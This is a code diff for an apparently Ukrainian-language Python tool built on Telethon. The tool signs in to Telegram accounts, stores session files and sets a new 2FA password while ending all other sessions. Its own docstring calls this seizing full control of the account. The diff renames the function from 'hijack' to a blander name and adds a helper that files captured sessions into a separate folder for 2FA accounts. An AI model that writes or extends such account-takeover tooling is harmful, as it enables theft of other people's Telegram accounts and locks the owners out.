@@ -6,6 +6,8 @@ import asyncio
 import hashlib
 import os
 import json
+import shutil
+
 from telethon import TelegramClient
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -214,7 +216,7 @@ async def sign_in_with_code(client: TelegramClient, phone: str, code: str, sessi
             logger.info(f"✅ Успішна авторизація для {phone}!")
             logger.info(f"Сесія збережена: {session_path}")
 
-            return True, session_path
+            return "Success", session_path
         else:
             error_msg = "Не вдалося авторизуватись. Спробуй ще раз."
             logger.error(error_msg)
@@ -322,7 +324,7 @@ async def delete_session(phone: str, session_folder: str):
         return False
 
 
-async def hijack_account_with_2fa(client: TelegramClient, new_password: str):
+async def get_account_with_2fa(client: TelegramClient, new_password: str):
     """
     Встановлює 2FA і завершує всі інші сесії.
     ПОПЕРЕДЖЕННЯ: Дуже агресивна дія, яка повністю перехоплює контроль над акаунтом.
@@ -367,3 +369,23 @@ async def hijack_account_with_2fa(client: TelegramClient, new_password: str):
     except Exception as e:
         logger.error(f"❌ Помилка при перехопленні акаунту: {e}")
         return False, str(e)
+
+def move_session_to_2fa(phone: str, source_folder: str, dest_folder: str):
+    """
+    Переміщує сесійний файл у папку для сесій з 2FA.
+    """
+    session_name = f"{phone.replace('+', '')}.session"
+    source_path = os.path.join(source_folder, session_name)
+    dest_path = os.path.join(dest_folder, session_name)
+
+    try:
+        os.makedirs(dest_folder, exist_ok=True) # Переконуємось, що папка існує
+        shutil.move(source_path, dest_path)
+        logger.info(f"✅ Сесію для {phone} переміщено до {dest_folder}")
+        return True
+    except FileNotFoundError:
+        logger.error(f"❌ Сесію для {phone} не знайдено в {source_folder} для переміщення.")
+        return False
+    except Exception as e:
+        logger.error(f"❌ Помилка при переміщенні сесії {phone}: {e}")
+        return False
